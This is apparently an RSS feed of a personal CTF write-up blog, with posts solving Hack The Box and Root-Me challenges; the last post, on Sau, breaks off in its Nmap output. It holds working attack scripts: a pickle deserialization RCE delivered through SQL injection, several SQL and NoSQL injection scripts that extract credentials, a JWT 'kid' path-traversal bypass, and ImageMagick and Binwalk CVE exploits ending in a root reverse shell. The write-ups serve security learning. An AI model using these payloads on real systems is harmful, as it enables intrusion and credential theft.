<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Achux21</title><description>Blog Writeups</description><link>https://iloveweb.online/</link><language>en</language><item><title>COP</title><link>https://iloveweb.online/posts/cop/</link><guid isPermaLink="true">https://iloveweb.online/posts/cop/</guid><pubDate>Tue, 02 Jan 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Description
The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!
:::&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution:&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;import pickle
import base64
import os
import requests

# Payload to be executed on the server
payload = &apos;cp flag.txt application/static/achux21.txt&apos;

# Class definition for creating a serialized payload using Pickle
class RCE:
    def __reduce__(self):
        return os.system, (payload,)

# If the script is run directly, not imported as a module
if __name__ == &apos;__main__&apos;:
    # Serialize the payload using Pickle and encode it in base64
    var = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode(&apos;ascii&apos;)

# Craft a URL to trigger the SQL injection vulnerability
# The UNION SELECT statement is used to inject the serialized payload
r = requests.get(f&quot;http://167.99.82.136:30931/view/%27%20UNION%20SELECT%27{var}&quot;)

# Retrieve the result of the executed payload
flag = requests.get(f&quot;http://167.99.82.136:30931/static/achux21.txt&quot;)

# Print the result (flag)
print(flag.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;Bye&lt;/h1&gt;
&lt;h1&gt;&lt;img src=&quot;https://y.yarn.co/787d48e3-8bf8-4364-91d4-98e55ef95579_text.gif&quot; alt=&quot;image&quot; /&gt;&lt;/h1&gt;
</content:encoded></item><item><title>Jwt - Unsecure File Signature</title><link>https://iloveweb.online/posts/jwt---unsecure-file-signature/</link><guid isPermaLink="true">https://iloveweb.online/posts/jwt---unsecure-file-signature/</guid><pubDate>Thu, 13 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Description : A previous Root Me administrator is trying to replicate the website after being banned for sharing challenge solutions. Try to find out if he is hiding any other flags on his new website.
:::&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Web-View&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/3da1e468-7b0c-409c-bc63-14eb8e139752&quot; alt=&quot;web-view&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I&apos;m having difficulty deciphering the location of Buttons on this website.&lt;/p&gt;
&lt;p&gt;Upon inspecting the page&apos;s source code, I discovered certain endpoints that seem intriguing.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/admin
static/challs/htmllecture.html
static/challs/irc.html
static/challs/obfu6.html
static/https://www.youtube.com/watch?v=ZYrmrflWBmY
static/challs/samboxv5.html
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;/admin&lt;/h1&gt;
&lt;p&gt;Upon accessing the &apos;admin&apos; endpoint at &lt;code&gt;http://challenge01.root-me.org:59081/admin&lt;/code&gt;, I encountered an &apos;Unauthorized&apos; error.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&quot;Unauthorized&quot;:&quot;You are not admin !&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;burp&lt;/h1&gt;
&lt;p&gt;I attempted to intercept the request using Burp in order to uncover more information.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/fde8ca6d-e02e-4e97-9c17-895ae42727cf&quot; alt=&quot;Burp-request&quot; /&gt;&lt;/p&gt;
&lt;p&gt;It appears that the situation involves JWT (JSON Web Tokens).&lt;/p&gt;
&lt;p&gt;To gain a clearer understanding, I searched for information on jwt.io to access helpful visualizations and explanations.&lt;/p&gt;
&lt;h1&gt;&lt;a href=&quot;https://jwt.io/&quot;&gt;JWT.IO&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/91d1b72b-d9db-49f6-951e-2509b73de49f&quot; alt=&quot;jwt-io&quot; /&gt;&lt;/p&gt;
&lt;p&gt;While encoding the JWT, I observed that it utilizes the HS256 (HMAC_SHA256) algorithm along with a &quot;kid&quot; (Key ID) parameter.&lt;/p&gt;
&lt;p&gt;The &quot;kid&quot; (key ID) claim is a string that signifies the key responsible for digitally signing the JWT.&lt;/p&gt;
&lt;p&gt;If you&apos;re interested in delving deeper into attacks involving the &quot;kid&quot; parameter in JWTs, you can find more information here: &lt;a href=&quot;https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter&quot;&gt;kid-parameter&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Afterwards, I proceeded to modify the JWT by signing it with a particular secret key and conducting attacks on the JWT &quot;kid&quot; header,
such as SQL injection and OS injection.
Eventually, I identified a path traversal vulnerability in the &quot;kid&quot; header.
I attempted to alter the &quot;kid&quot; header to &quot;/dev/null&quot; and sign the JWT with an empty secret key.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/32fba5ca-a326-4f55-b5cc-bf6b626ac6bf&quot; alt=&quot;empty-sign&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/a2a39c96-618b-4f2f-828e-0ccf479d7be4&quot; alt=&quot;path-traversal&quot; /&gt;&lt;/p&gt;
&lt;p&gt;However, a complication arose: there seems to be a replace function or a similar mechanism in place that eliminates our &quot;../&quot; sequences.&lt;/p&gt;
&lt;p&gt;Yet, we can overcome this by using the pattern &lt;code&gt;....//....//....//&lt;/code&gt; to bypass the restriction and continue with our intended manipulation.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/b92fdb13-7af9-454a-b882-1c0c9c92071a&quot; alt=&quot;final_sol&quot; /&gt;&lt;/p&gt;
&lt;p&gt;As a result of these efforts, we successfully obtained the flag!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/8c75a20d-8d09-4360-b427-60f1d8c9198c&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
&lt;p&gt;have Fun 💜&lt;/p&gt;
</content:encoded></item><item><title>Pilgrimage</title><link>https://iloveweb.online/posts/pilgrimage/</link><guid isPermaLink="true">https://iloveweb.online/posts/pilgrimage/</guid><pubDate>Thu, 13 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Description : Pilgrimage is an easy-difficulty Linux machine featuring a web application with an exposed &lt;code&gt;Git&lt;/code&gt; repository. Analysing the underlying filesystem and source code reveals the use of a vulnerable version of &lt;code&gt;ImageMagick&lt;/code&gt;, which can be used to read arbitrary files on the target by embedding a malicious &lt;code&gt;tEXT&lt;/code&gt; chunk into a PNG image. The vulnerability is leveraged to obtain a &lt;code&gt;SQLite&lt;/code&gt; database file containing a plaintext password that can be used to SSH into the machine. Enumeration of the running processes reveals a &lt;code&gt;Bash&lt;/code&gt; script executed by &lt;code&gt;root&lt;/code&gt; that calls a vulnerable version of the &lt;code&gt;Binwalk&lt;/code&gt; binary. By creating another malicious PNG, &lt;code&gt;CVE-2022-4510&lt;/code&gt; is leveraged to obtain Remote Code Execution (RCE) as &lt;code&gt;root&lt;/code&gt;.
:::&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Enum&lt;/h1&gt;
&lt;p&gt;Let&apos;s start with a quick Nmap scan.&lt;/p&gt;
&lt;h3&gt;Nmap Scan&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;root@Fs:.../HTB/Pilgrimage# nmap -p- -oN Nmap -sCV -T4 pilgrimage.htb 
# Nmap 7.80 scan initiated Sun Jun 25 16:17:30 2023 as: nmap -p- -oN Nmap -sCV -T4 pilgrimage.htb
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.34s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file &apos;description&apos; to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 25 16:21:47 2023 -- 1 IP address (1 host up) scanned in 256.71 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&apos;s check what&apos;s running on port 80.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/17d81c17-c872-440d-b3e8-d94e01776e80&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;It seems to be an upload server, Let&apos;s try uploading something;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/a336d714-72c4-46a3-a3a6-c350a1b28554&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;By reading the Nmap scan, we realized that there&apos;s a .git/ directory.
Let&apos;s try to dump its contents.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git-dumper http://pilgrimage.htb/ git/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;root@Fs:.../HTB/Pilgrimage# ls git/
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;By reading the contents of those files, we found some interesting information.
It appears that it&apos;s using SQLite as the database.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/0d63c601-be8e-4074-8e57-6efe1e773736&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/727f3288-669e-441c-b466-4c3d51edac78&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;It&apos;s using ImageMagick to convert images.&lt;/p&gt;
&lt;p&gt;By conducting a Google search, I found a &lt;a href=&quot;https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC&quot;&gt;! CVE-2022-44268&lt;/a&gt; (Common Vulnerabilities and Exposures) related to the discovered vulnerability.&lt;/p&gt;
&lt;p&gt;let&apos;s try This POC&lt;/p&gt;
&lt;p&gt;We have already identified the location where the DB stores data: &quot;/var/db/pilgrimage&quot;.&lt;/p&gt;
&lt;p&gt;Let&apos;s try to access this file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@Fs:.../Pilgrimage/imagemagick-lfi-poc# python3 generate.py  -f &quot;/var/db/pilgrimage&quot; -o exploit.png

   [&amp;gt;] ImageMagick LFI PoC - by Sybil Scan Research &amp;lt;research@sybilscan.com&amp;gt;
   [&amp;gt;] Generating Blank PNG
   [&amp;gt;] Blank PNG generated
   [&amp;gt;] Placing Payload to read /var/db/pilgrimage
   [&amp;gt;] PoC PNG generated &amp;gt; exploit.png
root@Fs:.../Pilgrimage/imagemagick-lfi-poc# convert exploit.png result.png
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Download Time:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@Fs:.../Pilgrimage/imagemagick-lfi-poc# wget http://pilgrimage.htb/shrunk/64af576f46ee8.png
--2023-07-13 02:46:53--  http://pilgrimage.htb/shrunk/64af576f46ee8.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219
Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1628 (1.6K) [image/png]
Saving to: ‘64af576f46ee8.png’

64af576f46ee8.png                     100%[========================================================================&amp;gt;]   1.59K  --.-KB/s    in 0s      

2023-07-13 02:46:54 (205 MB/s) - ‘64af576f46ee8.png’ saved [1628/1628]

root@Fs:.../Pilgrimage/imagemagick-lfi-poc# convert 64af576f46ee8.png result.png
root@Fs:.../Pilgrimage/imagemagick-lfi-poc# identify -verbose result.png 
[output...]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&apos;s copy the &quot;Raw profile type: &quot; string and decode it using CyberChef.&lt;/p&gt;
&lt;p&gt;From Hex;
&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/6d9921f5-934c-4328-984e-1b34a93e5c39&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Let&apos;s Download the sqlite file
&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/e4380801-0d68-4c84-b768-1710c9f1f2da&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Let&apos;s log in via SSH using those credentials.
&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/02bd70c4-39d2-4bff-b2b9-160e853cfd00&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;And we have successfully gained access .&lt;/p&gt;
&lt;h1&gt;Priv-esc&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;emily@pilgrimage:~$ ls
linPEAS.sh  pspy64  user.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&apos;s run pspy64 first, followed by Linpeas, and hope to gather some valuable information.&lt;/p&gt;
&lt;p&gt;After 10 years HAAHAH, we finally discovered some interesting findings.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;2023/07/13 12:06:18 CMD: UID=0     PID=713    | /bin/bash /usr/sbin/malwarescan.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The content:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/7dedbc7c-8cb4-41bd-adb3-cb2e889daecf&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I wasted a lot of time before realizing that Binwalk is outdated and has a CVE !! &lt;a href=&quot;https://www.exploit-db.com/exploits/51249&quot;&gt;Binwalk v2.3.2 - Remote Command Execution (RCE)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Let&apos;s utilize the ExploitDB script to gain root access&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
root@Fs:.../Pilgrimage/privesc# python3 exploit.py random-image.png 10.10.14.xxx 9999

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.

root@Fs:.../Pilgrimage/privesc# scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shrunk/
emily@10.10.11.219&apos;s password: 
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
binwalk_exploit.png                                                                                                  100% 1084     3.4KB/s   00:00    

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and we have access&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@Fs:.../Pilgrimage/privesc# nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.11.219 46362
ls
_binwalk_exploit.png.extracted
_e.png.extracted
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;
^Z
[1]+  Stopped                 nc -lnvp 9999
root@Fs:.../Pilgrimage/privesc# stty raw -echo;fg
nc -lnvp 9999
             root@pilgrimage:~/quarantine# export TERM=xterm-256color
root@pilgrimage:~/quarantine# export SHELL=/bin/bash
root@pilgrimage:~/quarantine# ls
_binwalk_exploit.png.extracted	_e.png.extracted
root@pilgrimage:~/quarantine# ls /root
quarantine  reset.sh  root.txt
root@pilgrimage:~/quarantine# 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Goodbye! 💜&lt;/p&gt;
</content:encoded></item><item><title>SQL:NoSQL ROOT-ME</title><link>https://iloveweb.online/posts/sqlnosql-root-me/</link><guid isPermaLink="true">https://iloveweb.online/posts/sqlnosql-root-me/</guid><description>SQL/NOSQL Challenge From Root-Me</description><pubDate>Sat, 20 Jan 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;SQL injection - Authentication - GBK&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3

import requests

session = requests.session()

url = &quot;http://challenge01.root-me.org:80/web-serveur/ch42/&quot;
cookies = {&quot;PHPSESSID&quot;: &quot;d98371dbbf99fdd892c6aed10ba46eb4&quot;, &quot;_ga_SRYSKX09J7&quot;: &quot;GS1.1.1705855195.3.1.1705855314.0.0.0&quot;, &quot;_ga&quot;: &quot;GA1.1.1754628006.1705777800&quot;}

data = {&quot;login&quot;: &quot;\xbf&apos; or 1=1 -- -&quot;, &quot;password&quot;: &quot;admin&quot;}

session.post(url, cookies=cookies, data=data, allow_redirects=True)
r = requests.get(url + &quot;logged.php&quot;, cookies=cookies)
print(r.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;SQL injection - String&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
url = &quot;http://challenge01.root-me.org:80/web-serveur/ch19/?action=recherche&quot;
cookies = {&quot;_ga_SRYSKX09J7&quot;: &quot;GS1.1.1705857779.4.1.1705858572.0.0.0&quot;, &quot;_ga&quot;: &quot;GA1.1.1754628006.1705777800&quot;}

pay = &quot;asd&apos; or id=&apos;1&apos; union select password,username from users-- -+&quot;
data = {&quot;recherche&quot;: pay}
r = requests.post(url, cookies=cookies, data=data)

soup = BeautifulSoup(r.text, &apos;html.parser&apos;)
beautified_html = soup.prettify()
print(beautified_html)

print(r.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;SQL injection - Numeric&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;import requests
from bs4 import BeautifulSoup

url = &quot;http://challenge01.root-me.org:80/web-serveur/ch18/?action=news&amp;amp;news_id=&quot;
cookies = {&quot;_ga_SRYSKX09J7&quot;: &quot;GS1.1.1705857779.4.1.1705859466.0.0.0&quot;, &quot;_ga&quot;: &quot;GA1.1.1754628006.1705777800&quot;}

sql = &quot;2 UNION SELECT 5555,username,password from users&quot;

r = requests.get(url + sql, cookies=cookies)

soup = BeautifulSoup(r.text, &apos;html.parser&apos;)
print(soup.prettify())
print(r.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;NoSQL injection - Authentication&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3

import string
import requests
import re

session = requests.session()

cookies = {&quot;_ga_SRYSKX09J7&quot;: &quot;GS1.1.1705857779.4.1.1705860242.0.0.0&quot;, &quot;_ga&quot;: &quot;GA1.1.1754628006.1705777800&quot;}

for i in string.printable:
    url = f&quot;http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]={i}&amp;amp;pass[$ne]=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
    r = session.get(url, cookies=cookies)
    if &quot;Bad username or bad password !&quot; not in r.text:
        matches = re.findall(r&apos;flag{.*?}&apos;, r.text)
        for match in matches:
            print(match)
            exit(0)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;SQL injection - Error&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import requests

url = &apos;http://challenge01.root-me.org/web-serveur/ch34/?action=contents&amp;amp;order=ASC,&apos;

passwords = &quot;p455w0rd_c0l&quot;
usernames = &quot;us3rn4m3_c0l&quot;
tablename = &quot;m3mbr35t4bl3&quot;
for i in range(120):
    r = requests.get(url + f&quot;(CAST((SELECT%20{usernames}%20FROM%20{tablename}%20LIMIT%201%20OFFSET%20{i})%20AS%20int))&quot;)
    if &quot;You need to be authenticated to access records&quot; not in r.text:
        print(r.text.replace(&quot;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;, &quot;&quot;).replace(&quot;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&quot;, &quot;&quot;).replace(&quot;&amp;lt;br&amp;gt;&quot;, &quot;\n&quot;))

for i in range(120):
    r = requests.get(url + f&quot;(CAST((SELECT%20{passwords}%20FROM%20{tablename}%20LIMIT%201%20OFFSET%20{i})%20AS%20int))&quot;)
    if &quot;You need to be authenticated to access records&quot; not in r.text:
        print(r.text.replace(&quot;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;, &quot;&quot;).replace(&quot;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&quot;, &quot;&quot;).replace(&quot;&amp;lt;br&amp;gt;&quot;, &quot;\n&quot;))
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;SQL injection - Blind&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import requests, string

url = &quot;http://challenge01.root-me.org:80/web-serveur/ch10/&quot;
cookies = {&quot;_ga_SRYSKX09J7&quot;: &quot;GS1.1.1705863979.6.1.1705865439.0.0.0&quot;, &quot;_ga&quot;: &quot;GA1.1.1754628006.1705777800&quot;}
username=&quot;admin&quot;
password=&quot;e2azO93i&quot;

def GetLength(username):
    for length in range(64):
        data = {&quot;username&quot;: f&quot;user1&apos; AND (select LENGTH(password) from users where username=&apos;{username}&apos; LIMIT 1)={length} --&quot;, &quot;password&quot;: &quot;z&quot;}
        r = requests.post(url, cookies=cookies, data=data)
        print(f&quot;Trying Length: {length} &quot;)
        if &quot;Welcome&quot; in r.text:
            return length


def GetPass(username, length):
    password = &quot;&quot;
    for index in range(1, length + 1):
        print(password)
        for char in string.printable:
            data = {&quot;username&quot;: f&quot;user1&apos; AND (SELECT SUBSTR(password,{index},1) FROM users WHERE username=&apos;{username}&apos;)=&apos;{char}&apos; --&quot;, &quot;password&quot;: &quot;z&quot;}
            r = requests.post(url, cookies=cookies, data=data)
            print(f&quot;Trying Index: {index}, Char {char}&quot;)
            if &quot;Welcome&quot; in r.text:
                password += char
                break
    return password

passwd = GetPass(username, GetLength(username))
print(passwd)


&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;SQL Truncation&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3

import requests

## Source Code have: 
# &amp;lt;!--
# CREATE TABLE IF NOT EXISTS user(   
# 	id INT NOT NULL AUTO_INCREMENT,
#     login VARCHAR(12),
#     password CHAR(32),
#     PRIMARY KEY (id));
# --&amp;gt;

url = &quot;http://challenge01.root-me.org:80/web-serveur/ch36/register.php&quot;

user = &quot;admin               hihi&quot; # &amp;gt; 12


data = {&quot;login&quot;: user, &quot;password&quot;: &quot;sirsirsir&quot;}

r = requests.post(url, data=data)

if &quot;User save&quot; in r.text:
    burp0_url = &quot;http://challenge01.root-me.org:80/web-serveur/ch36/admin.php&quot;
    burp0_data = {&quot;password&quot;: &quot;sirsirsir&quot;}
    rr = requests.post(burp0_url, data=burp0_data)
    print(rr.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;SQL injection - File reading&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import requests



# Getting The admin encoded credentials
burp0_url = &quot;http://challenge01.root-me.org:80/web-serveur/ch31/?action=members&amp;amp;id=1%20AND%201=2%20UNION%20ALL%20SELECT%20null,concat_ws(0x3a,member_id,member_login,member_password,member_email),null,version()%20from%20member--%20-+&quot;

# r = requests.get(burp0_url)


# Reading The index.php to decode The password 
file_to_read = &quot;/challenge/web-serveur/ch31/index.php&quot;
file_to_read_hex = file_to_read.encode().hex().upper()

payload = f&quot; AND 1=2 UNION SELECT 1,2,3,load_file(0x{file_to_read_hex})--&quot;

url = &quot;http://challenge01.root-me.org:80/web-serveur/ch31/?action=members&amp;amp;id=1 &quot; + payload
r = requests.get(url)
# print(r.text)

# decoding the password Using The key
import base64
def stringxor(o1, o2):
    res = &apos;&apos;
    for i in range(len(o1)):
        res += chr(ord(o1[i]) ^ ord(o2[i]))
    return res

key = &quot;c92fcd618967933ac463feb85ba00d5a7ae52842&quot; # from index.php
encrypted_data = &quot;VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==&quot; # from the database

decoded_data = base64.b64decode(encrypted_data).decode(&apos;utf-8&apos;)
result = stringxor(key, decoded_data)

# print(result)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/517d4a50-901a-4703-b850-0681ed10f552&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Sau</title><link>https://iloveweb.online/posts/sau/</link><guid isPermaLink="true">https://iloveweb.online/posts/sau/</guid><pubDate>Mon, 10 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note
Sau is an Easy Difficulty Linux machine that features a &lt;code&gt;Request Baskets&lt;/code&gt; instance that is vulnerable to Server-Side Request Forgery (SSRF) via &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-27163&quot;&gt;CVE-2023-27163&lt;/a&gt;. Leveraging the vulnerability we are to gain access to a Maltrail instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as puma. A sudo misconfiguration is then exploited to gain a root shell.
:::&lt;/p&gt;
&lt;h1&gt;Enumeration&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Jul  9 20:56:56 2023 as: nmap -sCV -oN Nmap -p- -vvv 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up, received echo-reply ttl 63 (0.31s latency).
Scanned at 2023-07-09 20:56:56 +01 for 585s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 09 Jul 2023 20:05:50 GMT
|     Content-Length: 27
|     href=&quot;/web&quot;&amp;gt;Found&amp;lt;/a&amp;gt;.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 09 Jul 2023 20:05:51 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.80%I=7%D=7/9%Time=64AB131E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A2,&quot;HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\x
SF:20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sun,\x2009\x20Jul\x202
SF:023\x2020:05:50\x20GMT\r\nContent-Length:\x2027\r\n\r\n&amp;lt;a\x20href=\&quot;/we
SF:b\&quot;&amp;gt;Found&amp;lt;/a&amp;gt;\.\n\n&quot;)%r(GenericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request&quot;)%r(HTTPOptions,60,&quot;HTTP/1\.0\x2020
SF:0\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sun,\x2009\x20Jul\x202
SF:023\x2020:05:51\x20GMT\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,
SF:67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)
SF:%r(Help,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest&quot;)%r(SSLSessionReq,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
